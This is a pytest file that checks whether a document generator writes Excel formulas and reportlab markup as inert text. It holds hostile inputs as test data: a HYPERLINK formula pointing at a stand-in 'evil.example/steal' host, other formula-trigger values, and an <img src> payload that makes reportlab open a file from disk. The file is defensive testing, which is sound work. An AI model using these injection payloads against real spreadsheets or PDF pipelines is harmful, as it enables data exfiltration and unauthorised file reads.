# -- the three real holes --------------------------------------------------


POISON = '=HYPERLINK("http://evil.example/steal","click me")'


def test_a_formula_from_a_customer_email_is_written_as_text(vault, config):
    """**Excel formula injection.**

    openpyxl turns any value starting with `=` into a live formula. Content in
    these documents comes from account notes and pasted email, and a workbook
    that evaluates what a customer wrote is not something to send back to that
    customer.
    """
    made = make(
        vault, config, kind="xlsx",
        blocks=(docs.table(["Note"], [[POISON], ["+1+1"], ["@SUM(A1)"], ["-2"]]),),
    )
    xml = sheet_xml(made.path)

    assert "<f>" not in xml and "<f " not in xml, "no cell may hold a formula"
    assert "HYPERLINK" in xml, "the text itself is written verbatim, not removed"
    assert 'inlineStr' in xml or 't="s"' in xml
    assert made.formulas_as_text == 4, "and the operator is told how many"


def test_reportlab_would_have_read_a_file_off_disk(vault, config, tmp_path):
    """**Why the PDF writer escapes.** Evidence, not an assertion about us.

    `Paragraph` parses a small HTML-like markup that includes `<img src>`, and
    reportlab opens that path when the page renders. This test proves the
    hazard is real, and the next one proves the escape closes it.
    """
    reportlab = pytest.importorskip("reportlab")
    import io

    from reportlab.lib.styles import getSampleStyleSheet
    from reportlab.platypus import Paragraph, SimpleDocTemplate

    bait = tmp_path / "bait.txt"
    bait.write_text("not an image", encoding="utf-8")
    with pytest.raises(Exception) as caught:
        SimpleDocTemplate(io.BytesIO()).build(
            [Paragraph(f'a <img src="{bait}"/> b', getSampleStyleSheet()["Normal"])]
        )
    assert "bait" in str(caught.value) or "Image" in type(caught.value).__name__


def test_markup_in_the_content_is_printed_rather_than_obeyed(vault, config, tmp_path):
    bait = tmp_path / "bait.txt"
    bait.write_text("not an image", encoding="utf-8")
    made = make(
        vault, config, kind="pdf",
        blocks=(docs.text(f'before <img src="{bait}"/> <b>bold</b> after'),),
    )

    pypdf = pytest.importorskip("pypdf")
    text = pypdf.PdfReader(str(made.path)).pages[0].extract_text()
    assert "<img" in text, "the markup is content, printed as content"
    assert "<b>bold</b>" in text, "and not interpreted as formatting either"


